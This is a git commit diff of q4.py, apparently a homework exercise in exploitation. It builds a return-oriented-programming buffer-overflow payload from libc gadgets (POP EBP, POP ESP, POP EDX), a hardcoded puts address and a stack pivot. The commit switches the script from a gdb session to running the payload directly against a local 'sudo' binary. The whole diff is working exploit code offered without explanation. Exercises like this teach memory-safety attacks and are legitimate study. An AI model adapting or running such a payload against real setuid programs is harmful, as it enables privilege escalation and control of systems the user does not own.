4ba634acc0d34a3c702301476ec5b803c67057d4
user <matanlevy90@gmail.com>
2017-05-07 18:55:39 +0300

    q4 working

--- q4.py
+++ q4.py
@@ -16,17 +16,18 @@ def get_arg():
     import search
     gs = search.GadgetSearch('libc.bin',0xb7c39750)
     loop_add = 0xbfffe144
-    puts_address = 0x8048580
-    pop_ebx = gs.find('POP EBP').decode("hex")[::-1]
+    str_address = loop_add + 20
+    puts_address = 0xb7c81ca0
+    pop_ebp = gs.find('POP EBP').decode("hex")[::-1]
     pop_esp = gs.find('POP ESP').decode("hex")[::-1]
     skip_stack = gs.find('POP EDX').decode("hex")[::-1]
-    my_str = 'Hello'
-    return 'a'*66 + pop_ebx + struct.pack('<I',puts_address) + struct.pack('<I',puts_address) + skip_stack + my_str
+    my_str = get_string(304978372)
+    return 'a'*66 + pop_ebp + struct.pack('<I',puts_address) + struct.pack('<I',puts_address) + skip_stack + struct.pack('<I',str_address) + pop_esp + struct.pack('<I',loop_add) +  my_str
 
 
 def main(argv):
-    #os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())
-    os.execl('/usr/bin/gdb', '/usr/bin/gdb', '-ex=r', '--args', './sudo', get_arg())
+    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())
+    #os.execl('/usr/bin/gdb', '/usr/bin/gdb', '-ex=r', '--args', './sudo', get_arg())
 
 
 if __name__ == '__main__':
